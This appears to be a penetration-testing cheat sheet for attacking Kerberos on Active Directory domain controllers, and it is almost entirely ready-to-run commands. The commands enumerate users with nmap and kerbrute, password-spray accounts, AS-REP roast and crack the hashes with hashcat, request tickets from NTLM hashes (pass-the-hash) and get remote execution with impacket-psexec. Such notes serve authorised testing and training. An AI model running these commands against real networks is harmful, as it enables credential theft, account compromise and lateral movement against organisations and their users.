# Kerberos Enumeration (88)

## Sync time with the DC
```bash
sudo ntpdate domain.local
```

## Run nmap Kerberos scripts
```bash
nmap -p 88 --script=krb5-enum-users,krb5-realm $IP
```

## Enumerate usernames with kerbrute
```bash
kerbrute userenum -d domain.local --dc $IP /usr/share/wordlists/seclists/Usernames/Names/names.txt
```

## Password spray with kerbrute
```bash
kerbrute passwordspray -d domain.local --dc $IP users.txt 'Password123!'
```

## No-creds AS-REP roast
```bash
impacket-GetNPUsers domain.local/ -dc-ip $IP -usersfile users.txt -request -format hashcat -outputfile asrep_hashes.txt
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```

## Request TGT with NTLM hash
```bash
impacket-getTGT domain.local/username -hashes :ntlm_hash
```

## Use a Kerberos ticket with Impacket
```bash
export KRB5CCNAME=username.ccache
impacket-psexec domain.local/username@target.domain.local -k -no-pass
```
